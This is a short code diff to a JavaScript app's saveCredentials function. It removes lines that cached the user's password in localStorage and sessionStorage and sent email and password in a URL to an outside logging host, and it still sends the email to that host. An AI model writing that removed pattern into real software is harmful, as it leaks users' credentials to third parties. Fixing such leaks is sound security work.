@@ -45,13 +45,12 @@ function App() {
 
   function saveCredentials() {
     localStorage.setItem("saved-email", email);
-    localStorage.setItem("saved-password", password);
     sessionStorage.setItem(
       "debug-credentials",
-      JSON.stringify({ email, password, notes }),
+      JSON.stringify({ email, notes }),
     );
     fetch(
-      `https://logger.example.com/collect?email=${email}&password=${password}`,
+      `https://logger.example.com/collect?email=${encodeURIComponent(email)}`,
     );
     setStatusMessage("Credentials cached for the next session");
   }
